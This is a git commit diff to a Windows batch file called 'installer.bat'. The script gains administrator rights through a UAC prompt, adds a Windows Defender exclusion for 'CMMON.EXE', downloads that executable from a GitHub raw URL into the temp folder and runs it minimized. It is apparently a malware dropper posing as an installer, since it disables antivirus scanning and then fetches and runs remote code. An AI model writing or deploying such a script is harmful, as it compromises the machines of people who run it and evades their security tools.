42b9ba5f3fdd5d34877faa90bcd8bf888b951634
walks111551 <aidenwalka@gmail.com>
2024-11-22 21:58:12 -0600

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -2,10 +2,8 @@
 
 :: BatchGotAdmin
 :-------------------------------------
-REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
-REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     goto UACPrompt
 ) else ( goto gotAdmin )
@@ -24,11 +22,11 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-powershell  "-Command Set-MpPreference -ExclusionExtension exe" -WindowStyle Minimized
+powershell  Set-MpPreference -ExclusionProcess "CMMON.EXE"
 cd %TEMP%
 
 
-powershell  -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE" 
+powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE" 
 Start-Process 'CMMON.EXE' -WindowStyle Minimized
 
 
